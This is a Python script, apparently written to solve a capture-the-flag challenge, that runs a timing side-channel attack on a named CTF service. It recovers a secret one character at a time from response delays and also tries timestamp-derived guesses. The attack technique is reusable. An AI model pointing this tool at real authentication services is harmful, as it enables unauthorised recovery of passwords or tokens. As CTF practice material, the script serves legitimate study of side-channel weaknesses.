#!/usr/bin/env python3
"""
CTF Timing Attack Tool - "Its all about timings"
Usage: python3 timing_attack.py
"""
import socket
import time
import string
import statistics

HOST = "3-nh01.bootupctf.net"
PORT = 8229
CHARSET = string.ascii_letters + string.digits + "_-{}"
SAMPLES = 5  # Number of samples per character (more = more accurate)

def communicate(challenge: str, timeout=10) -> tuple[str, float]:
    """Send a challenge, return (response, elapsed_time)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((HOST, PORT))

        # Read until we see the prompt ":"
        banner = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            banner += chunk
            if b":" in banner:
                break

        print(f"[BANNER] {banner.decode(errors='replace').strip()}")

        # Send challenge and time the response
        start = time.perf_counter()
        s.sendall((challenge + "\n").encode())

        response = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass

        elapsed = time.perf_counter() - start
        s.close()
        return response.decode(errors='replace').strip(), elapsed

    except Exception as e:
        return f"ERROR: {e}", -1


def probe(inputs=None):
    """Quick probe with various inputs to understand the service."""
    if inputs is None:
        inputs = ["", "test", "0", "1", "flag", "CTF", "BOOT", "admin"]
    print("\n=== PROBE MODE ===")
    for inp in inputs:
        resp, t = communicate(inp)
        print(f"  {repr(inp):<20} | {t:.4f}s | {repr(resp[:100])}")


def timed_sample(challenge: str, n=SAMPLES) -> float:
    """Return median response time over n samples."""
    times = []
    for _ in range(n):
        _, t = communicate(challenge)
        if t > 0:
            times.append(t)
        time.sleep(0.1)
    return statistics.median(times) if times else -1


def timing_attack_bruteforce(known_prefix="", max_len=40):
    """
    Timing attack: build the answer character by character.
    Assumes longer time = more characters matched.
    """
    print(f"\n=== TIMING ATTACK (prefix={repr(known_prefix)}) ===")
    current = known_prefix

    for pos in range(len(known_prefix), max_len):
        best_char = None
        best_time = -1
        results = {}

        print(f"\n[*] Position {pos}, testing {len(CHARSET)} chars...")
        for c in CHARSET:
            candidate = current + c
            t = timed_sample(candidate, n=SAMPLES)
            results[c] = t
            print(f"    '{c}' -> {t:.4f}s", end="\r")

        # Sort by time descending
        sorted_results = sorted(results.items(), key=lambda x: x[1], reverse=True)
        best_char, best_time = sorted_results[0]
        second_char, second_time = sorted_results[1]

        print(f"\n  Best: '{best_char}' ({best_time:.4f}s)  |  2nd: '{second_char}' ({second_time:.4f}s)")

        # If the gap is meaningful
        gap = best_time - second_time
        print(f"  Gap: {gap:.4f}s")

        current += best_char
        print(f"  Current answer: {repr(current)}")

        # Try submitting what we have
        resp, _ = communicate(current)
        print(f"  Server says: {repr(resp[:100])}")
        if "flag" in resp.lower() or "correct" in resp.lower() or "boot" in resp.lower():
            print(f"\n[+] FLAG FOUND: {resp}")
            return current


def unix_timestamp_attack():
    """
    Try submitting the current Unix timestamp or time-derived values.
    Useful if the challenge is TOTP-like.
    """
    print("\n=== TIMESTAMP ATTACK ===")
    for delta in range(-5, 6):
        ts = int(time.time()) + delta
        for fmt in [str(ts), hex(ts), f"{ts:08x}"]:
            resp, t = communicate(fmt)
            print(f"  ts+{delta:+d} ({fmt}) -> {t:.4f}s | {repr(resp[:80])}")
            if "flag" in resp.lower() or "correct" in resp.lower():
                print(f"[+] HIT! {resp}")
                return fmt


if __name__ == "__main__":
    import sys

    print("=== CTF Timing Tool ===")
    print(f"Target: {HOST}:{PORT}\n")

    if len(sys.argv) > 1:
        mode = sys.argv[1]
    else:
        # Default: start with a probe
        mode = "probe"

    if mode == "probe":
        probe()
        print("\n[*] Now try: python3 timing_attack.py timestamp")
        print("[*] Or:      python3 timing_attack.py brute")

    elif mode == "timestamp":
        unix_timestamp_attack()

    elif mode == "brute":
        prefix = sys.argv[2] if len(sys.argv) > 2 else ""
        timing_attack_bruteforce(known_prefix=prefix)

    elif mode == "send":
        # python3 timing_attack.py send "your_challenge_here"
        challenge = sys.argv[2]
        resp, t = communicate(challenge)
        print(f"Response ({t:.4f}s): {resp}")
